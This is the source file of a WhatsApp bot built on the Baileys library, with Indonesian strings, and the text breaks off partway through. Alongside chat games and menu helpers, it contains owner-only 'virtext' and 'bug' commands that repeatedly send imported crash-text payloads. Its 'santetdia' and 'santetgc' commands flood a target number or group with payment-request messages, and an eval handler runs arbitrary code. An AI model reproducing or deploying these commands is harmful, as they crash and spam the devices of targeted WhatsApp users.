/*
› Create By BossRaehan
› Base Ori Y4LL
WA : 081528628870
*/

//════════════════════════════//
require('./RaehanEdit')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const axios = require('axios')
const path = require('path')
const os = require('os')
const cl = require('caliph-api') 
const crypto = require('crypto')
const hx = require('hxz-api')
const mel = require('kitsune-api')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const google = require('google-it')
const mathjs = require('mathjs')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const { exec, spawn, execSync } = require("child_process")
const { ngazap } = require('./DataBoss/virtex/ngazap')
const { buttonvirus } = require('./DataBoss/virtex/buttonvirus')
const { buttonhan } = require('./DataBoss/virtex/buttonhan')
const { virtex1 } = require('./DataBoss/virtex/virtex1')
const { virtex2 } = require('./DataBoss/virtex/virtex2')
const { virtex, vipi } = require('./DataBoss/virtex/virtex.js')
const { iphone } = require('./DataBoss/virtex/iphone')
const { iphone1 } = require('./DataBoss/virtex/iphone1')
const { iphone2 } = require('./DataBoss/virtex/iphone2')
const { iphone3 } = require('./DataBoss/virtex/iphone3')
const { iphone4 } = require('./DataBoss/virtex/iphone4')
const { iphone5 } = require('./DataBoss/virtex/iphone5')
const { iphone6 } = require('./DataBoss/virtex/iphone6')
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./DataBoss/lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
//════════════════════════════//
const content = JSON.stringify(m.message)
const cerpen = require('./DataBoss/lib/cerpen')
//════════════════════════════//
virgam = fs.readFileSync(`./DataBoss/image/deden.jpeg`)
const Mthumb = fs.readFileSync ('./DataBoss/image/rey.jpg')
const thumbnail = fs.readFileSync ('./DataBoss/image/mamak.jpg')
const mekih = fs.readFileSync ('./DataBoss/image/deden.jpeg')
const { mediafireDl } = require('./DataBoss/lib/mediafire.js')
const banned = JSON.parse(fs.readFileSync('./DataBoss/dbnye/banned.json'))


  
//════════════════════════════//

// Time & Date
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam'
}
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Petang'
 }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore'
 }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang'
 }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi'
 }
if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Malam'
 }
//════════════════════════════//
module.exports = BossRaehan = async (BossRaehan, m, chatUpdate, store) => {
 try {
 var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
//════════════════════════════//
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await BossRaehan.decodeJid(BossRaehan.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const isBan = banned.includes(m.sender)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
//════════════════════════════//
// Group
const groupMetadata = m.isGroup ? await BossRaehan.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const welcm = m.isGroup ? wlcm.includes(from) : false
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
const AntiNsfww = m.isGroup ? ntnsfww.includes(from) : false
	

//════════════════════════════//
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
// Random Image Simple Menu
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]
//document randomizer
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const timeJak = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const timeMak = moment(Date.now()).tz('Asia/Makassar').locale('id').format('HH:mm:ss z')
const timeJay = moment(Date.now()).tz('Asia/Jayapura').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const qtod = m.quoted? "true":"false"
// Date
moment.tz.setDefault("Asia/Jakarta").locale("id");

//════════════════════════════//
const Raehan = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "14169948404-1305080833@g.us" } : {}) 
},
"contextInfo": {
"stanzaId": "3EB0382EDBB2",
"externalAdReply": {
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg`,
"thumbnailUrl": 'https://telegra.ph/file/dbb1a0521d07b5eeb504c.jpg', 
"thumbnail": `https://telegra.ph/file/60e2afbef5528557a9273.jpg`
}}}
//════════════════════════════//
const ReyDong = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `𝗥𝗔𝗘𝗛𝗔𝗡 1986${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}
//════════════════════════════//
const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
"mimetype": "image/webp",
"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
"fileLength": "14240",
"mediaKeyTimestamp": "1664991742",
"isAnimated": false
}}}
//════════════════════════════//
const bal= (teks) => {
BossRaehan.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `𝗥𝗔𝗘𝗛𝗔𝗡 1986 ${ngazap(prefix)}`,"body": `𝗥𝗔𝗘𝗛𝗔𝗡 1986 ${ngazap(prefix)}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail":Mthumb,"sourceUrl": `https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg`}}}, { quoted: ReyDong })
} 
// Target
const reply = (teks) => {
return BossRaehan.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `𝗦𝗖 𝗥𝗔𝗘𝗛𝗔𝗡 1986`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": Mthumb,"sourceUrl": `https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg`}}}, { quoted: Raehan })
} 

const anjay = (teks) => {
 BossRaehan.sendMessage(m.chat, { image: Mthumb, caption: teks, contextInfo:{"externalAdReply": {"title": `𝗦𝗖 𝗥𝗔𝗘𝗛𝗔𝗡 1986`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg`,
thumbnailUrl: 'https://telegra.ph/file/dbb1a0521d07b5eeb504c.jpg', 
thumbnail: Mthumb,
}
}}, { quoted: Raehan})
}
//════════════════════════════//
const deploy = (teks) => {
  BossRaehan.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
}
//════════════════════════════//
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
let chats = global.db.data.chats[m.chat]
if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
if (chats) {
if (!('mute' in chats)) chats.mute = false
} else global.db.data.chats[m.chat] = {
mute: false,
}
let settings = db.data.settings[botNumber]
if (typeof settings !== 'object') db.data.settings[botNumber] = {}
if (settings) {
if (!('available' in settings)) settings.available = false
if (!('composing' in settings)) settings.composing = false
if (!('recording' in settings)) settings.recording = true
} else db.data.settings[botNumber] = {
available: false,
composing: false,
recording: true,
}

//════════════════════════════//


	
	    
//════════════════════════════// 

if(autorecording) {
if(autorecording == true)
await BossRaehan.sendPresenceUpdate('recording', m.chat)
} else if(autoketik){
if(autoketik == false)
await BossRaehan.sendPresenceUpdate('composing', m.chat)
} else if(autoavailable){
if(autoavailable == false)
await BossRaehan.sendPresenceUpdate('available', m.chat)
}

} catch (err) {
console.log(err)
}
                   
             

// Public & Self
if (!BossRaehan.public) {
if (!m.key.fromMe) return
}
//console 
if (m.message) {
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m CMD \x1b[1;37m]', time, chalk.
yellow(budy || m.mtype), 'from', chalk.red(pushname), 'in', chalk.blue(groupName ? groupName : 'Private Chat' ), 'args :', chalk.yellow(text.length))
 }
//════════════════════════════// 








//════════════════════════════//
// Mute Chat
if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
return
}
//════════════════════════════//

//════════════════════════════//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
userJid: BossRaehan.user.id,
quoted: Raehan.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, BossRaehan.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
BossRaehan.ev.emit('messages.upsert', msg)
}
//════════════════════════════//
if (budy.startsWith('©️')) {
if (!isCreator) return
if (isBan) throw (from)

try {
return anjay(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
anjay(e)
}
}
//════════════════════════════//
//Suit PvP
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
BossRaehan.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = m.chat
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
BossRaehan.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) BossRaehan.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) BossRaehan.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) BossRaehan.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
BossRaehan.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
anjay(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) BossRaehan.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
anjay(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) BossRaehan.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
BossRaehan.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}
@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}
//════════════════════════════//
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
anjay(`
Apakah Ada Yang Ingin Di Tanyakan ${reason ? 'Ada Yang Bisa Saya Bantu? ' + reason : 'Terima Kasih'}
Waktu ${clockString(new Date - afkTime)}
`.trim())
}
if (db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
anjay(`
𝗛𝗔𝗟𝗟𝗢 𝗦𝗔𝗬𝗔 𝗥𝗔𝗘𝗛𝗔𝗡 1986${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
//════════════════════════════//

switch(command) {

//════════════════════════════//





//═════════════VIRTEXT═══════════════//
case 'virtext1': {
if (!isCreator) return
if (isBan) throw (from)
if (args.length == 0) return m.reply(`𝐉𝐮𝐦𝐥𝐚𝐡𝐧𝐲𝐚?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
BossRaehan.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg' }, caption: `𝗥𝗔𝗘𝗛𝗔𝗡 ${iphone}` }, { quoted: doc })
}
}
break

case 'virtext2': {
if (!isCreator) return
if (isBan) throw (from)
if (args.length == 0) return m.reply(`𝐉𝐮𝐦𝐥𝐚𝐡𝐧𝐲𝐚?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
BossRaehan.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg' }, caption: `𝗥𝗔𝗘𝗛𝗔𝗡 ${iphone1}` }, { quoted: doc })
}
}
break


case 'virtext3': {
if (!isCreator) return
if (isBan) throw (from)
if (args.length == 0) return m.reply(`𝐉𝐮𝐦𝐥𝐚𝐡𝐧𝐲𝐚?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
BossRaehan.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg' }, caption: `𝗥𝗔𝗘𝗛𝗔𝗡 ${iphone2}` }, { quoted: doc })
}
}
break


case 'virtext4': {
if (!isCreator) return
if (isBan) throw (from)
if (args.length == 0) return m.reply(`𝐉𝐮𝐦𝐥𝐚𝐡𝐧𝐲𝐚?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
BossRaehan.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg' }, caption: `𝗥𝗔𝗘𝗛𝗔𝗡 ${iphone3}` }, { quoted: doc })
}
}
break


case 'virtext5': {
if (!isCreator) return
if (isBan) throw (from)
if (args.length == 0) return m.reply(`𝐉𝐮𝐦𝐥𝐚𝐡𝐧𝐲𝐚?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
BossRaehan.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg' }, caption: `𝗥𝗔𝗘𝗛𝗔𝗡 ${iphone4}` }, { quoted: doc })
}
}
break


case 'virtext6': {
if (!isCreator) return
if (isBan) throw (from)
if (args.length == 0) return m.reply(`𝐉𝐮𝐦𝐥𝐚𝐡𝐧𝐲𝐚?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
BossRaehan.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg' }, caption: `𝗥𝗔𝗘𝗛𝗔𝗡 ${iphone5}` }, { quoted: doc })
}
}
break


case 'virtext7': {
if (!isCreator) return
if (isBan) throw (from)
if (args.length == 0) return m.reply(`𝐉𝐮𝐦𝐥𝐚𝐡𝐧𝐲𝐚?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
BossRaehan.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg' }, caption: `𝗥𝗔𝗘𝗛𝗔𝗡 ${iphone6}` }, { quoted: doc })
}
}
break


case 'virtext8': {
if (!isCreator) return
if (isBan) throw (from)
if (args.length == 0) return m.reply(`𝐉𝐮𝐦𝐥𝐚𝐡𝐧𝐲𝐚?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
BossRaehan.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg' }, caption: `𝗥𝗔𝗘𝗛𝗔𝗡 ${buttonhan}` }, { quoted: doc })
}
}
break


case 'virtext9': {
if (!isCreator) return
if (isBan) throw (from)
if (args.length == 0) return m.reply(`𝐉𝐮𝐦𝐥𝐚𝐡𝐧𝐲𝐚?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
BossRaehan.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg' }, caption: `𝗥𝗔𝗘𝗛𝗔𝗡 ${buttonvirus}` }, { quoted: doc })
}
}
break


case 'virtext10': {
if (!isCreator) return
if (isBan) throw (from)
if (args.length == 0) return m.reply(`𝐉𝐮𝐦𝐥𝐚𝐡𝐧𝐲𝐚?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
BossRaehan.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg' }, caption: `𝗥𝗔𝗘𝗛𝗔𝗡 ${ngazap(prefix)}`}, { quoted: doc })
}
}
break





//════════════════════════════//
case 'bugtagall': {
if (!isCreator) return
if (isBan) throw (from)

let teks = `╔══════[ 𝐏𝐄𝐒𝐀𝐍 ]══════⊱\n╠➤ ${q ? q : 'kosong'}\n╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱\n\n\n\n\n`
for (let mem of participants) {
teks += `╔══════[ 𝐓𝐀𝐆 ]══════⊱\n╠➤ @${mem.id.split('@')[0]}\n╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱\n\n\n`
}
BossRaehan.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: ReyDong })
}
break
case 'pollingyuk': {
if (!isCreator) return
if (isBan) throw (from)
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": "AKU YANG TERLUKA",
"options": [
	{
"optionName": "UNTUK YANG SEKIAN KALINYA"
	},
	{
"optionName": "SUDAH CUKUP SUDAH"
	},
	{
"optionName": "SAKIT YANG KU RASA"
	},
	{
"optionName": "KAU PUTUSKAN PERGI"
	},
	{
"optionName": "TINGGALKAN AKU"
	},
	{
"optionName": "DEMI DIRINYA"
	},
	{
"optionName": "SEMOGA ENGKAU BAHAGIA"
	},
	{
"optionName": "DENGAN DIRINYA DI SANA"
	},
	{
"optionName": "JANGAN HIRAUKAN DIRIKU"
	},
	{
"optionName": "DI SINI YANG TERLUKA"
	}
],
"selectableOptionsCount": 10
	}
}), { userJid: m.chat, quoted: ReyDong })
BossRaehan.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
deploy('ROG PHONE')
}
break
//════════════════════════════//
case 'troli2': {
if (!isCreator) return
if (isBan) throw (from)

var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
	"orderMessage": {
	"orderId": "599519108102353",
	"thumbnail": virgam,
	"itemCount": 1999,
	"status": "INQUIRY",
	"surface": "CATALOG",
	"message": " 𝗥𝗔𝗘𝗛𝗔𝗡 1986 V2 ",
	"orderTitle": " BUG TROLI ", // 
	"sellerJid": "6281528628870@s.whatsapp.net",
	"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ==",
}
}), { userJid: m.chat, quoted: ReyDong })
BossRaehan.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
break
//════════════════════════════//
case 'ampunom' : {

if (isBan) throw (from)

BossRaehan.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `𝗦𝗖 𝗥𝗔𝗘𝗛𝗔𝗡 1986`,"body": `Selamat ${salam} kak ${pushname}`,
mimetype: 'audio/mpeg', caption: `${buttonhan}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg`,
thumbnailUrl: 'https://telegra.ph/file/dbb1a0521d07b5eeb504c.jpg', 
thumbnail: virgam,
}
}}}}}, { quoted:ReyDong})
}
break
case 'santetdia': {
if (!isCreator) return
if (isBan) throw (from)
if (args.length < 1) return anjay(`*Syntax Error!*\n\nUse : ${command} nomor target|amount spam|timer\nExample : ${command} 62888s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
anjay(`Baiklah Tuan`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./DataBoss/image/rey.jpg') }, { upload: BossRaehan.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `𝗠𝗬 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥 𝗥𝗔𝗘𝗛𝗔𝗡 1986`,
}
}}), { userJid: m.chat, quoted: ReyDong})
BossRaehan.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
anjay(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break
case 'santetgc': {
if (!isCreator) return
if (isBan) throw (from)
if (args.length < 1) return anjay(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
anjay(`Baiklah Tuan`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./DataBoss/image/rey.jpg') }, { upload: BossRaehan.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `𝗠𝗬 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥 𝗥𝗔𝗘𝗛𝗔𝗡 1986`,
}
}}), { userJid: m.chat, quoted: ReyDong})
BossRaehan.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
anjay(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break
case 'ducu': {
if (!isCreator) return
if (isBan) throw (from)

yy = fs.readFileSync('./DataBoss/sound/RAEHAN1986.Raehan')
BossRaehan.sendMessage(m.chat, {document: yy, mimetype: 'application/octet-stream', fileName:`BossRaehan APIs ~ 404 ${buttonhan}.Raehan` }, {quoted:ReyDong})
}
break
case 'daca': {
if (!isCreator) return
if (isBan) throw (from)

 ilih = fs.readFileSync('./DataBoss/sound/RAEHAN1986.Raehan')
 BossRaehan.sendMessage(m.chat, {document: ilih, mimetype: '', fileName:`BossRaehan APIs ~ 404 ${buttonhan}.Raehan` }, {quoted:ReyDong})
 }
 break
case 'docu': {
if (!isCreator) return
if (isBan) throw (from)

var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({	
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
